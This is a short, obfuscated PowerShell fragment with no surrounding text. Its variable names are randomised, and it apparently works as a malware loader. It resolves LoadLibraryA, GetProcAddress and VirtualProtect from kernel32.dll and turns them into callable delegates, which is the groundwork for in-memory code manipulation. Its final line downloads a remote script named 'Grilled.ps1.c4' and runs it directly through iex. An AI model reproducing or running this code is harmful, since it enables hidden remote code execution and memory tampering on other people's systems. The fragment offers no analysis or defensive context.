$ofYLOSZFkQMXiJCuCOUznwUuCyRwiKEuEtDH = Get-ProcAddress kernel32.dll LoadLibraryA
$FFLXceGnyvhGqRtWGirnRBgblvZBSd = Get-DelegateType @([String]) ([IntPtr])
$NHrfpnuQQKkhjEBfRTFrWghM = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ofYLOSZFkQMXiJCuCOUznwUuCyRwiKEuEtDH,
$FFLXceGnyvhGqRtWGirnRBgblvZBSd)
$XMRYZJNLxAldxvpjjtZWNAEhXudXpS = Get-ProcAddress kernel32.dll GetProcAddress
$CwUYRNvCcjGirAvFdnFMSqvliDuAyMWmpGS = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
$hqXIYzZYxOqTyPXpwIJlPFaFuSeyjn = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($XMRYZJNLxAldxvpjjtZWNAEhXudXpS,
$CwUYRNvCcjGirAvFdnFMSqvliDuAyMWmpGS)
$ylrQokmzmDUJqzBpMtelgVkfe = Get-ProcAddress kernel32.dll VirtualProtect
$HJvqwyftZvoabuzenDQKOemchz = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
$jjtTnLPIWtlNZiEBsMZCWfvZwpNZqXwLWHiNS = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ylrQokmzmDUJqzBpMtelgVkfe,
$HJvqwyftZvoabuzenDQKOemchz)
$wbc.DownloadString("$prefixpath/Grilled.ps1.c4") | iex
